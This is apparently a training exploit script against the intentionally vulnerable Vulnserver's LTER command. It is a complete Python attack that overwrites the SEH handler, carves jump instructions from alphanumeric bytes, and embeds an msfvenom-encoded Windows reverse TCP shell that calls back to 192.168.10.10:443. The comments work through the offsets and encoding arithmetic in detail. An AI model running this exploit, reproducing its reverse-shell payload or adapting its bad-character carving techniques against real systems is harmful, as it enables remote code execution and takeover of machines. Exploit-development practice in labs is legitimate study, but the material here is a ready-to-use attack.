#!/usr/bin/python
import socket,sys,os,struct

'''
!! Memory Addresses change, but math is the same each time so it doesn't matter !!

[*] Exact match at offset 3519
6250172B   5F               POP EDI		# in C:\Users\n0bfu\Desktop\OSCE_Prep\essfunc.dll
6250172C   5D               POP EBP
6250172D   C3               RETN

018DFFC4   74 06            JE SHORT 018DFFCC	# JUmp forward 6 bytes


>> jump back 127 bytes
.. setting the first jump to write up from bottom of D's when decoding
0191FFFC = Last D in buffer (actual was 0191FFFF, but left 4 off for stack alignment)
0191ECA4 = ESP after jump
= 0x1358 (4952 decimal byte) diff

54          PUSH ESP        ; Push the value of ESP onto the stack
58          POP EAX         ; Pop that value into EAX
66055813 	ADD AX,1358		 ; Add 0x1358 to the AX register
50          PUSH EAX        ; Push this new value onto the stack
5C          POP ESP         ; Pop this value into ESP
ESP = 0191FFFC

.. jumping back 127 bytes
0191FFD8   25 22222222	AND EAX, 22222222		; zero out EAX
0191FFDD	  25 5D5D5D5D 	AND EAX, 5d5d5d5d		; zero out EAX
0191FFE2   05 76405050	ADD EAX, 50504076
0191FFE7   05 75404040	ADD EAX, 40404075		; EAX = "\x90\x90\x80\xEB" .. JMP back 127 bytes
0191FFE7   50				PUSH EAX


>> jump back to beginning of A buffer for encoded shellcode
.. setting the 2nd jump to write up from bottom of A's when decoding shellcode
0197FFC3 = Last A in buffer
0197FFF8 = ESP after jump 
= 0x35 (53 decimal byte) diff

54          PUSH ESP        ; Push the value of ESP onto the stack
58          POP EAX         ; Pop that value into EAX
2C 35 	   SUB AX,35		 ; Subtract 0x35 from the AX register
50          PUSH EAX        ; Push this new value onto the stack
5C          POP ESP         ; Pop this value into ESP

.. jumping to beginning of A buffer for payload += 
0179F209 = First A
0179FF7A = Landing after jump back 127 bytes
= 0x0D71 (3441 decimal byte) diff; this means There will have to be 3441 A's followed by espAdj2, fill in remain A's

.. Writing encoded shellcode; manipulating EBX and jumping to it since EAX is being used with carving
54            PUSH ESP
5B            POP EBX
81EB710D0000  SUB EBX, 0xD71	; Not allowed characters, encode
FFD3          CALL EBX			; Not allowed characters, encode


D3FF = 4655 + 4655 + 4755	; random, however I need 4 more bytes...
46551111 + 46551111 + 47551111 = D3FF3333
D3FF3333 - 3333 = D3FF

0D71 EB81
  0D 71 EB 81
- 07 53 78 42		; random allowed numbers
--------------
  06 1E 73 3F		; allowed numbers which subtracted by itself is 0

			  54					 PUSH ESP
			  5B					 POP EBX
01A3FF82   25 22222222      AND EAX,22222222
01A3FF87   25 5D5D5D5D      AND EAX,5D5D5D5D
01A3FF8C   05 11115546      ADD EAX,46551111
01A3FF91   05 11115546      ADD EAX,46551111
01A3FF96   05 11115547      ADD EAX,47551111
01A3FF9B   2D 33330000      SUB EAX,3333
01A3FFA0   50               PUSH EAX				; EAX = D3FF0000 (CALL EBX)
01A3FFA1   25 22222222      AND EAX,22222222
01A3FFA6   25 5D5D5D5D      AND EAX,5D5D5D5D
01A3FFAB   05 42785307      ADD EAX,7537842
01A3FFB0   05 3F731E06      ADD EAX,61E733F
01A3FFB5   50               PUSH EAX				; EAX = EBX (Start of A's in buffer)

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -f python -b '\x00' -e x86/alpha_mixed BufferRegister=EBX -v payload
payload size: 702 bytes
'''
buf_totlen = 5005

payload = "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
payload += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
payload += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42" 
payload += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"        
payload += "\x79\x6c\x38\x68\x4d\x52\x47\x70\x43\x30\x35\x50\x53" 
payload += "\x50\x4d\x59\x5a\x45\x54\x71\x49\x50\x75\x34\x4e\x6b" 
payload += "\x52\x70\x34\x70\x4c\x4b\x73\x62\x54\x4c\x4c\x4b\x71"        
payload += "\x42\x47\x64\x4c\x4b\x32\x52\x31\x38\x56\x6f\x78\x37"               
payload += "\x51\x5a\x66\x46\x35\x61\x79\x6f\x4c\x6c\x37\x4c\x35"
payload += "\x31\x33\x4c\x77\x72\x34\x6c\x61\x30\x79\x51\x68\x4f"
payload += "\x54\x4d\x47\x71\x7a\x67\x59\x72\x79\x62\x30\x52\x66"
payload += "\x37\x6e\x6b\x31\x42\x36\x70\x4e\x6b\x62\x6a\x55\x6c"
payload += "\x4e\x6b\x72\x6c\x72\x31\x52\x58\x59\x73\x31\x58\x35"
payload += "\x51\x38\x51\x50\x51\x6e\x6b\x63\x69\x31\x30\x57\x71"
payload += "\x6e\x33\x6c\x4b\x30\x49\x44\x58\x6a\x43\x66\x5a\x61"
payload += "\x59\x4c\x4b\x50\x34\x6e\x6b\x77\x71\x69\x46\x66\x51"
payload += "\x39\x6f\x4c\x6c\x4a\x61\x68\x4f\x74\x4d\x33\x31\x58"
payload += "\x47\x47\x48\x6b\x50\x62\x55\x6b\x46\x66\x63\x43\x4d"
payload += "\x4b\x48\x67\x4b\x61\x6d\x65\x74\x53\x45\x39\x74\x32"
payload += "\x78\x6e\x6b\x76\x38\x45\x74\x37\x71\x68\x53\x70\x66"
payload += "\x4c\x4b\x34\x4c\x50\x4b\x6c\x4b\x52\x78\x45\x4c\x66"
payload += "\x61\x6b\x63\x6c\x4b\x66\x64\x4c\x4b\x67\x71\x68\x50"
payload += "\x6d\x59\x72\x64\x37\x54\x54\x64\x73\x6b\x73\x6b\x75"
payload += "\x31\x70\x59\x70\x5a\x62\x71\x59\x6f\x49\x70\x73\x6f"
payload += "\x53\x6f\x72\x7a\x6c\x4b\x65\x42\x38\x6b\x4c\x4d\x33"
payload += "\x6d\x35\x38\x30\x33\x57\x42\x63\x30\x47\x70\x53\x58"
payload += "\x32\x57\x54\x33\x36\x52\x71\x4f\x73\x64\x73\x58\x70"
payload += "\x4c\x70\x77\x77\x56\x43\x37\x39\x6f\x58\x55\x68\x38"
payload += "\x6a\x30\x55\x51\x43\x30\x33\x30\x71\x39\x7a\x64\x51"
payload += "\x44\x70\x50\x61\x78\x36\x49\x6d\x50\x42\x4b\x57\x70"
payload += "\x79\x6f\x78\x55\x62\x70\x42\x70\x70\x50\x50\x50\x53"
payload += "\x70\x46\x30\x37\x30\x62\x70\x62\x48\x49\x7a\x34\x4f"
payload += "\x69\x4f\x79\x70\x39\x6f\x6b\x65\x6c\x57\x43\x5a\x53"
payload += "\x35\x65\x38\x59\x50\x69\x38\x57\x7a\x77\x7a\x31\x78"
payload += "\x67\x72\x45\x50\x65\x51\x6d\x6b\x6b\x39\x6b\x56\x33"
payload += "\x5a\x36\x70\x53\x66\x61\x47\x33\x58\x6e\x79\x4e\x45"
payload += "\x50\x74\x30\x61\x6b\x4f\x59\x45\x6d\x55\x6b\x70\x30"
payload += "\x74\x44\x4c\x49\x6f\x50\x4e\x67\x78\x62\x55\x58\x6c"
payload += "\x50\x68\x6a\x50\x4c\x75\x6f\x52\x50\x56\x39\x6f\x78"
payload += "\x55\x30\x68\x43\x53\x50\x6d\x33\x54\x63\x30\x4e\x69"
payload += "\x68\x63\x72\x77\x30\x57\x33\x67\x70\x31\x58\x76\x52"
payload += "\x4a\x57\x62\x66\x39\x36\x36\x5a\x42\x69\x6d\x31\x76"
payload += "\x4b\x77\x72\x64\x46\x44\x37\x4c\x63\x31\x33\x31\x6c"
payload += "\x4d\x47\x34\x51\x34\x66\x70\x5a\x66\x35\x50\x77\x34"
payload += "\x46\x34\x46\x30\x43\x66\x33\x66\x76\x36\x37\x36\x66"
payload += "\x36\x70\x4e\x32\x76\x61\x46\x30\x53\x43\x66\x70\x68"
payload += "\x52\x59\x6a\x6c\x45\x6f\x6b\x36\x39\x6f\x78\x55\x6d"
payload += "\x59\x4b\x50\x70\x4e\x70\x56\x47\x36\x59\x6f\x50\x30"
payload += "\x72\x48\x54\x48\x6d\x57\x37\x6d\x65\x30\x4b\x4f\x4a"
payload += "\x75\x6f\x4b\x48\x70\x4f\x45\x6f\x52\x32\x76\x71\x78"
payload += "\x39\x36\x4c\x55\x4f\x4d\x4f\x6d\x69\x6f\x39\x45\x75"
payload += "\x6c\x36\x66\x53\x4c\x67\x7a\x4b\x30\x59\x6b\x6d\x30"
payload += "\x64\x35\x76\x65\x6f\x4b\x51\x57\x66\x73\x70\x72\x32"
payload += "\x4f\x33\x5a\x35\x50\x66\x33\x49\x6f\x48\x55\x41\x41"

espAdj2 = "\x54\x58\x2C\x35\x50\x5C"				# move ESP to bottom of A's
jumpback2 = "\x54\x5B"									# PUSH ESP, POP EBX
jumpback2 += "\x25\x22\x22\x22\x22"					# AND EAX
jumpback2 += "\x25\x5D\x5D\x5D\x5D"					# AND EAX
jumpback2 += "\x05\x11\x11\x55\x46"
jumpback2 += "\x05\x11\x11\x55\x46"
jumpback2 += "\x05\x11\x11\x55\x47"
jumpback2 += "\x66\x2d\x33\x33"						# SUB AX
jumpback2 += "\x50"										# PUSH EAX
jumpback2 += "\x25\x22\x22\x22\x22"					# AND EAX
jumpback2 += "\x25\x5D\x5D\x5D\x5D"					# AND EAX
jumpback2 += "\x05\x42\x78\x53\x07"
jumpback2 += "\x05\x3F\x73\x1E\x06"
jumpback2 += "\x50"

nseh = "\x74\x06\x90\x90"
seh = struct.pack("<I", 0x6250172B)

espAdj1 = "\x54\x58\x66\x05\x58\x13\x50\x5C"		# move ESP to bottom of D's
jumpback1 = "\x25\x22\x22\x22\x22"					# AND EAX
jumpback1 += "\x25\x5D\x5D\x5D\x5D"					# AND EAX
jumpback1 += "\x05\x76\x40\x50\x50"					# ADD EAX
jumpback1 += "\x05\x75\x40\x40\x40"					# ADD EAX
jumpback1 += "\x50"										# PUSH EAX


buffer = "A" * 68
buffer += "\x43" * 32
buffer += payload
buffer += "A" * (3341 - len(payload))
buffer += espAdj2
buffer += jumpback2
buffer += "A" * (3515 - 3441 - len(espAdj2) - len(jumpback2) - 10)	# 3515 is when nseh gets overwritten
buffer += "\x44"	# Allign stack before shellcode execution
buffer += "A" * 9
buffer += nseh
buffer += seh
buffer += espAdj1
buffer += jumpback1
buffer += "C" * (buf_totlen - len(buffer))

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.10.30", 9999))
s.send("LTER /.:/" + buffer + "\r\n")
s.close()

